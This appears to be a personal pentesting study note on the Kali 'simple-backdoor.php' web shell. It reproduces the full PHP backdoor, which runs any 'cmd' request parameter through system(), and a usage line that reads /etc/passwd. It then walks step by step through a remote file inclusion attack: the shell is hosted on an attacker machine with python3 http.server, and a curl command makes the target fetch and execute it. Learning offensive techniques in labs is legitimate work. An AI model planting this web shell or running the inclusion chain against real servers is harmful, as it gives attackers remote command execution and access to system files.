# Overview

## Location
'/usr/share/webshells/php/simple-backdoor.php'
## Code Review
~~~ php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

~~~
### Application
This web-shell uses the 'cmd' parameter and executes them via the system function.  These functions are executed against the file-system on the host (target) machine.
In order for this exploit to work, we need to make the remote file accessible by the target system.  We can use the 'Python3 http.server' module to start a web-server on our Kali machine and serve the file we want to include remotely on the target system.  The http.server module sets the web root to the current directory of our terminal.
~~~ bash
# start a Python3 http.server on the host (Kali) machine
python3 -m http.server 80

# result below from running the Python3 http server
serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)...

~~~
After the web server is running with 'usr/share/webshells/php' as its current working directory, we have completed all necessary steps on our attacking machine.  
Next we use 'curl' to include the hosted file via HTTP and specify 'ls' as our command.
~~~ bash
# using curl to instruct the target machine to download the web-shell from the python3 http.server

curl "http://192.168.0.1/subdirectory/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

# first url is the target machine
# second url is the kali machine
# simple-backdoor.php is the web-shell php script
# cmd=ls is the command that the web-shell will run
# the result will be the 'ls' of the target (192.168.0.1/subdirectory) machine
~~~

## Tags
#webshell
#php
#simplebackdoor 
#remotefileinclusion
#webapplications